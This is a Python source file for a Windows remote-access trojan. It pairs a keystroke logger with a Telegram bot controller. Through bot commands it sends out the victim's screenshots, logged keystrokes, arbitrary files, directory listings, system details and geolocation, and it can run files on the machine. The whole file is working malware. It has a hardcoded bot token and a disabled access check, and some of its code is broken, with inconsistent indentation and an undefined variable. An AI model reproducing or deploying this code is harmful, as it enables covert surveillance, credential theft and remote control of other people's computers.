#!/usr/bin/env python

from PIL import ImageGrab
from time import strftime
import telepot
import requests
import os
import os.path
import platform
import pyHook
import pythoncom
import ctypes
import json

initi = False
user = os.environ.get("USERNAME")	# Windows username
log_file = 'keylogs.txt'	# name of log file
with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")

def pressed_chars(event):	# on key pressed function
    if event.Ascii:
        f = open(log_file,"a")	# open log_file in append mode
        char = chr(event.Ascii)	# insert real char in variable
        if event.Ascii == 8:	# if char is "backspace"
        	f.write("[BS]")
	if event.Ascii == 9:	# if char is "tab"
		f.write("[TAB]")
        if event.Ascii == 13:	# if char is "backspace"
            f.write("[ENTER]\n")
        f.write(char)	# write every char pressed

def handle(msg):
	ID = msg['chat']['id']
	command = msg['text']
	print('')
	#print(strftime('[%d %b, %y %r] ') + str(chat_id) + ': ' + command)
	print command
	print msg

	if checkchat_id(ID):
		if command == '/capture_pc':
			bot.sendChatAction(chat_id, 'typing')
			screenshot = ImageGrab.grab()
			screenshot.save('screenshot.jpg')
			bot.sendChatAction(chat_id, 'upload_photo')
			bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
			os.remove('screenshot.jpg')

		elif command == '/keylogs':
			bot.sendChatAction(chat_id, 'upload_document')
			bot.sendDocument(chat_id, open(log_file, "rb"))

		elif command == '/pc_info':
			bot.sendChatAction(chat_id, 'typing')
			info = ''
			for pc_info in platform.uname():
				info += '\n' + pc_info
			bot.sendMessage(chat_id, info)

		elif command.startswith('/msg_box '):
			message = command.replace('/msg_box ', '')
			if message == '':
				bot.sendMessage(chat_id, '/msg_box yourText')
			else:
				ctypes.windll.user32.MessageBoxA(0, message, 'Information', 0)
				bot.sendMessage(chat_id, 'MsgBox Displayed')

		elif command == '/ip_info':
			bot.sendChatAction(chat_id, 'find_location')
			info = requests.get('http://ipinfo.io').text
			bot.sendMessage(chat_id, info)
			location = (json.loads(info)['loc']).split(',')
			bot.sendLocation(chat_id, location[0], location[1])

		elif command.startswith('/download_file'):
			path = command.replace('/download_file', '')
			path = path[1:]
			if path == '':
				bot.sendChatAction(chat_id, 'typing')
				bot.sendMessage(chat_id, '/download_file C:/path/to/file')
			else:
				try:
					bot.sendChatAction(chat_id, 'upload_document')
					bot.sendDocument(chat_id, open(path, 'rb'))
				except:
					bot.sendMessage(chat_id, 'Could not find file')

		elif command.startswith('/list_dir'):
			bot.sendChatAction(chat_id, 'typing')
			path = command.replace('/list_dir', '')
			path = path[1:]
			if path == '':
				bot.sendMessage(chat_id, '/list_dir C:/path/to/folder')
			else:
				try:
					files = os.listdir(path)
					human_readable = ''
					for file in files:
						human_readable += file + '\n'
					human_readable += human_readable + '\n^Contents of ' + path
					bot.sendMessage(chat_id, human_readable)
				except:
					bot.sendMessage(chat_id, 'Invalid path')

		elif command.startswith('/run_file'):
			bot.sendChatAction(chat_id, 'typing')
			path = command.replace('/run_file', '')
			path = path[1:]
			if path == '':
				bot.sendMessage(chat_id, '/run_file C:/path/to/file')
			else:
				os.startfile(path)
				bot.sendMessage(chat_id, 'Command executed')

		elif command == '/self_destruct':
			bot.sendChatAction(chat_id, 'typing')
			global initi
			initi = True
			bot.sendMessage(chat_id, "You sure? Type 'DESTROYNOW!' to proceed.")

		elif command == 'DESTROYNOW!' and initi == True:
			bot.sendChatAction(chat_id, 'typing')
			bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
			# self_destruct

def checkchat_id(ID):
	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
	known_ids = ['124356']
	# COMMENT THE LINE 'return True'!
	return True

	try:
		return str(chat_id) in known_ids
	except:
		return str(chat_id) == known_ids

# REPLACE 'abcd1234' BY THE TOKEN OF THE BOT YOU GENERATED!
bot = telepot.Bot('294475425:AAHoXv8nh2zXlJDJ38jEJOTOJnmeHsUSpI0')

bot.message_loop(handle)
print 'Listening to commands...'

proc = pyHook.HookManager()
proc.KeyDown = pressed_chars
proc.HookKeyboard()
pythoncom.PumpMessages()
